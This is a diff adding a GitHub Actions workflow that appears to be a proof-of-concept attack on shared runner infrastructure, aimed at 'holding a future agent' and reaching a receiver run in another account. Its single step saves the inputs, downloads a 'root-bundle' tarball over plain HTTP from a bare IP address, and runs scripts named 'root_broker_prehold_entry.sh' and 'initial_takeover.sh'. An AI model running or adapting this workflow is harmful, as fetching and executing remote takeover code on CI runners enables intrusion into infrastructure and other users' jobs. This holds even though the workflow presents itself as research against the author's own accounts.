@@ -1,0 +1,54 @@
+name: Owned broker future-agent prehold source
+
+on:
+  workflow_dispatch:
+    inputs:
+      receiver_billing_owner_id:
+        description: BillingOwnerId of the owned receiver account
+        required: true
+      receiver_repository:
+        description: Expected owned receiver repository (owner/name)
+        required: true
+      receiver_run_id:
+        description: Expected owned receiver workflow run ID
+        required: true
+      receiver_nonce:
+        description: High-entropy marker in the owned receiver job
+        required: true
+      hold_seconds:
+        description: Polling window, 30-900 seconds
+        default: "600"
+        required: true
+
+permissions:
+  contents: read
+
+jobs:
+  prehold:
+    runs-on: ubuntu-slim
+    timeout-minutes: 15
+    env:
+      RECEIVER_BILLING_OWNER_ID: ${{ inputs.receiver_billing_owner_id }}
+      RECEIVER_REPOSITORY: ${{ inputs.receiver_repository }}
+      RECEIVER_RUN_ID: ${{ inputs.receiver_run_id }}
+      RECEIVER_NONCE: ${{ inputs.receiver_nonce }}
+      BROKER_HOLD_SECONDS: ${{ inputs.hold_seconds }}
+    steps:
+      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
+
+      - name: Hold future agent and verify only the owned receiver
+        run: |
+          python3 - <<'PY'
+          import json, os
+          fields = ("RECEIVER_BILLING_OWNER_ID", "RECEIVER_REPOSITORY",
+                    "RECEIVER_RUN_ID", "RECEIVER_NONCE", "BROKER_HOLD_SECONDS")
+          open("/tmp/broker-prehold-config.json", "w").write(json.dumps(
+              {key: os.environ[key] for key in fields}, separators=(",", ":")))
+          PY
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          cp poc/broker_prehold_receiver.py /tmp/broker_prehold_receiver.py
+          cp poc/root_broker_prehold_entry.sh /tmp/root_auto.sh
+          chmod +x /tmp/root_auto.sh /tmp/broker_prehold_receiver.py
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
+          sleep 840
